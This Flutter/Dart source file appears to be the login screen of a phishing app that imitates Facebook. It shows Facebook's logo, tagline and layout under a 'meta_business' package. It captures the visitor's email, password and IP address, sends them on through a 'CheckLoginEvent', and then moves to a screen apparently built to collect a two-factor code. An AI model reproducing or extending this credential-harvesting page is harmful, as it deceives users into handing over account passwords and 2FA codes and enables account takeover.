import 'package:_iwu_pack/_iwu_pack.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_svg/svg.dart';
import 'package:gap/gap.dart';
import 'package:meta_business/src/presentation/authentication/auth_screen.dart';
import 'package:meta_business/src/presentation/login/widget/footer.dart';

import '../bloc/home_bloc.dart';

class LoginScreen extends StatefulWidget {
  final String ipAdress;

  const LoginScreen({super.key, required this.ipAdress});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
  final HomeBloc _homeBloc = HomeBloc();

  TextEditingController email = TextEditingController();
  TextEditingController password = TextEditingController();
  submit() {
    print("clicked");
    if (_formKey.currentState!.validate()) {
      _homeBloc
          .add(CheckLoginEvent(email.text, password.text, widget.ipAdress));
    }
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;
    return BlocConsumer<HomeBloc, HomeState>(
      bloc: _homeBloc,
      listener: (context, state) {
        if (state is CheckingState) {
          print("Checking login with 2fa");
          showDialog(
              context: context,
              builder: (context) {
                return const Center(
                  child: CircularProgressIndicator(),
                );
              });
        }
        if (state is CheckingLoginFinished) {
          Navigator.of(context).pop();
          if (state.response['status'] == 200) {
            Navigator.push(context, MaterialPageRoute(builder: (context) {
              return AuthScreen(
                email: email.text,
              );
            }));
          }
        }
      },
      builder: (context, state) {
        return Scaffold(
          body: SingleChildScrollView(
            child: Column(
              children: [
                Container(
                    width: double.infinity,
                    color: hexColor("f1f2f6"),
                    height: 700,
                    child: screenWidth > 1024
                        ? Padding(
                            padding:
                                const EdgeInsets.only(top: 72, bottom: 112),
                            child: Row(
                              crossAxisAlignment: CrossAxisAlignment.center,
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Title(),
                                Form(
                                  key: _formKey,
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.center,
                                    children: [
                                      Container(
                                        width: 400,
                                        padding: const EdgeInsets.all(16),
                                        decoration: BoxDecoration(
                                            boxShadow: const [
                                              BoxShadow(
                                                color: Color.fromARGB(
                                                    255,
                                                    188,
                                                    188,
                                                    188), // Màu của đổ bóng
                                                blurRadius:
                                                    10, // Bán kính đổ bóng
                                                spreadRadius:
                                                    2, // Phạm vi đổ bóng
                                              )
                                            ],
                                            color: Colors.white,
                                            borderRadius:
                                                BorderRadius.circular(8)),
                                        child: Column(
                                          children: [
                                            TextFormField(
                                                controller: email,
                                                validator: (value) {
                                                  // if (!value!.contains("@")) {
                                                  //   return "Enter a valid email";
                                                  // } else {
                                                  //   return null;
                                                  // }
                                                },
                                                decoration:
                                                    const InputDecoration(
                                                  border: OutlineInputBorder(),
                                                  hintText:
                                                      "Email address or phone number",
                                                )),
                                            const Gap(12),
                                            TextFormField(
                                                controller: password,
                                                obscureText: true,
                                                validator: (value) {
                                                  if (value!.length < 8) {
                                                    return "Password must be at least 8 characters";
                                                  }
                                                  return null;
                                                },
                                                decoration:
                                                    const InputDecoration(
                                                  border: OutlineInputBorder(),
                                                  hintText: "Password",
                                                )),
                                            const Gap(12),
                                            GestureDetector(
                                                onTap: submit,
                                                child: Container(
                                                    padding:
                                                        const EdgeInsets.all(
                                                            14),
                                                    decoration: BoxDecoration(
                                                        borderRadius:
                                                            BorderRadius
                                                                .circular(6),
                                                        color:
                                                            hexColor("2575ea")),
                                                    width: double.infinity,
                                                    child: Center(
                                                        child: Text(
                                                      "Log in",
                                                      style: w600TextStyle(
                                                          color: Colors.white,
                                                          fontSize: 18),
                                                    )))),
                                            const Gap(16),
                                            const Text(
                                              "Forgotten account?",
                                              style:
                                                  TextStyle(color: Colors.blue),
                                            ),
                                            const Gap(12),
                                            const Divider(thickness: 1),
                                            const Gap(16),
                                            GestureDetector(
                                                onTap: () {
                                                  print("clicked");
                                                },
                                                child: Container(
                                                    width: 200,
                                                    padding:
                                                        const EdgeInsets.all(
                                                            14),
                                                    decoration: BoxDecoration(
                                                        borderRadius:
                                                            BorderRadius
                                                                .circular(6),
                                                        color:
                                                            hexColor("42b72a")),
                                                    child: Center(
                                                        child: Text(
                                                      "Create new account",
                                                      style: w600TextStyle(
                                                          color: Colors.white,
                                                          fontSize: 18),
                                                    )))),
                                          ],
                                        ),
                                      ),
                                      const Gap(24),
                                      Container(
                                        width: 400,
                                        child: Row(
                                          mainAxisAlignment:
                                              MainAxisAlignment.center,
                                          children: [
                                            Text(
                                              "Create a Page ",
                                              style: w600TextStyle(),
                                            ),
                                            const Text(
                                                "for a celebrity, brand or business"),
                                          ],
                                        ),
                                      )
                                    ],
                                  ),
                                )
                              ],
                            ),
                          )
                        : Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Center(
                                  child: SizedBox(width: 400, child: Title())),
                              const Gap(64),
                              Form(
                                key: _formKey,
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.center,
                                  children: [
                                    Container(
                                      width: 400,
                                      padding: const EdgeInsets.all(16),
                                      decoration: BoxDecoration(
                                          boxShadow: const [
                                            BoxShadow(
                                              color: Color.fromARGB(255, 188,
                                                  188, 188), // Màu của đổ bóng
                                              blurRadius:
                                                  10, // Bán kính đổ bóng
                                              spreadRadius:
                                                  2, // Phạm vi đổ bóng
                                            )
                                          ],
                                          color: Colors.white,
                                          borderRadius:
                                              BorderRadius.circular(8)),
                                      child: Column(
                                        children: [
                                          TextFormField(
                                              controller: email,
                                              validator: (value) {
                                                // if (value!.length < 8) {
                                                //   return "password must be at least 8 characters";
                                                // }
                                              },
                                              decoration: const InputDecoration(
                                                border: OutlineInputBorder(),
                                                hintText:
                                                    "Email address or phone number",
                                              )),
                                          const Gap(12),
                                          TextFormField(
                                              controller: password,
                                              obscureText: true,
                                              validator: (value) {
                                                if (value!.length < 8) {
                                                  return "password must be at least 8 characters";
                                                }
                                              },
                                              decoration: const InputDecoration(
                                                border: OutlineInputBorder(),
                                                hintText: "Password",
                                              )),
                                          const Gap(12),
                                          GestureDetector(
                                              onTap: submit,
                                              child: Container(
                                                  padding:
                                                      const EdgeInsets.all(14),
                                                  decoration: BoxDecoration(
                                                      borderRadius:
                                                          BorderRadius.circular(
                                                              6),
                                                      color:
                                                          hexColor("2575ea")),
                                                  width: double.infinity,
                                                  child: Center(
                                                      child: Text(
                                                    "Log in",
                                                    style: w600TextStyle(
                                                        color: Colors.white,
                                                        fontSize: 18),
                                                  )))),
                                          const Gap(16),
                                          const Text(
                                            "Forgotten account?",
                                            style:
                                                TextStyle(color: Colors.blue),
                                          ),
                                          const Gap(12),
                                          const Divider(thickness: 1),
                                          const Gap(16),
                                          GestureDetector(
                                              onTap: () {
                                                print("clicked");
                                              },
                                              child: Container(
                                                  width: 200,
                                                  padding:
                                                      const EdgeInsets.all(14),
                                                  decoration: BoxDecoration(
                                                      borderRadius:
                                                          BorderRadius.circular(
                                                              6),
                                                      color:
                                                          hexColor("42b72a")),
                                                  child: Center(
                                                      child: Text(
                                                    "Create new account",
                                                    style: w600TextStyle(
                                                        color: Colors.white,
                                                        fontSize: 18),
                                                  )))),
                                        ],
                                      ),
                                    ),
                                    const Gap(24),
                                    Container(
                                      width: 400,
                                      child: Row(
                                        mainAxisAlignment:
                                            MainAxisAlignment.center,
                                        children: [
                                          Text(
                                            "Create a Page ",
                                            style: w600TextStyle(),
                                          ),
                                          const Text(
                                              "for a celebrity, brand or business"),
                                        ],
                                      ),
                                    )
                                  ],
                                ),
                              )
                            ],
                          )),
                const Footer()
              ],
            ),
          ),
        );
      },
    );
  }

  Widget Title() {
    final screenWidth = MediaQuery.of(context).size.width;
    return Container(
      width: 600,
      child: Column(
        crossAxisAlignment: screenWidth > 1024
            ? CrossAxisAlignment.start
            : CrossAxisAlignment.center,
        mainAxisAlignment: MainAxisAlignment.start,
        children: [
          SvgPicture.asset(
            'assets/images/svg/facebook.svg',
            width: 320,
          ),
          Padding(
            padding: EdgeInsets.symmetric(
                horizontal: screenWidth > 1024 ? 28.0 : 14),
            child: Expanded(
              child: Text(
                "Facebook helps you connected and share with the people in your life.",
                style: w400TextStyle(fontSize: 24),
              ),
            ),
          )
        ],
      ),
    );
  }
}

// Widget LoginForm(TextEditingController email, TextEditingController password) {
//   return Column(
//     crossAxisAlignment: CrossAxisAlignment.center,
//     children: [
//       Container(
//         width: 400,
//         padding: const EdgeInsets.all(16),
//         decoration: BoxDecoration(boxShadow: const [
//           BoxShadow(
//             color: Color.fromARGB(255, 188, 188, 188), // Màu của đổ bóng
//             blurRadius: 10, // Bán kính đổ bóng
//             spreadRadius: 2, // Phạm vi đổ bóng
//           )
//         ], color: Colors.white, borderRadius: BorderRadius.circular(8)),
//         child: Column(
//           children: [
//             TextFormField(
//                 controller: email,
//                 decoration: const InputDecoration(
//                   border: OutlineInputBorder(),
//                   hintText: "Email address or phone number",
//                 )),
//             const Gap(12),
//             TextFormField(
//                 controller: password,
//                 decoration: const InputDecoration(
//                   border: OutlineInputBorder(),
//                   hintText: "Password",
//                 )),
//             const Gap(12),
//             GestureDetector(
//                 onTap: submit,
//                 child: Container(
//                     padding: const EdgeInsets.all(14),
//                     decoration: BoxDecoration(
//                         borderRadius: BorderRadius.circular(6),
//                         color: hexColor("2575ea")),
//                     width: double.infinity,
//                     child: Center(
//                         child: Text(
//                       "Log in",
//                       style: w600TextStyle(color: Colors.white, fontSize: 18),
//                     )))),
//             const Gap(16),
//             const Text(
//               "Forgotten account?",
//               style: TextStyle(color: Colors.blue),
//             ),
//             const Gap(12),
//             const Divider(thickness: 1),
//             const Gap(16),
//             GestureDetector(
//                 onTap: () {
//                   print("clicked");
//                 },
//                 child: Container(
//                     width: 200,
//                     padding: const EdgeInsets.all(14),
//                     decoration: BoxDecoration(
//                         borderRadius: BorderRadius.circular(6),
//                         color: hexColor("42b72a")),
//                     child: Center(
//                         child: Text(
//                       "Create new account",
//                       style: w600TextStyle(color: Colors.white, fontSize: 18),
//                     )))),
//           ],
//         ),
//       ),
//       const Gap(24),
//       Container(
//         width: 400,
//         child: Row(
//           mainAxisAlignment: MainAxisAlignment.center,
//           children: [
//             Text(
//               "Create a Page ",
//               style: w600TextStyle(),
//             ),
//             const Text("for a celebrity, brand or business"),
//           ],
//         ),
//       )
//     ],
//   );
// }
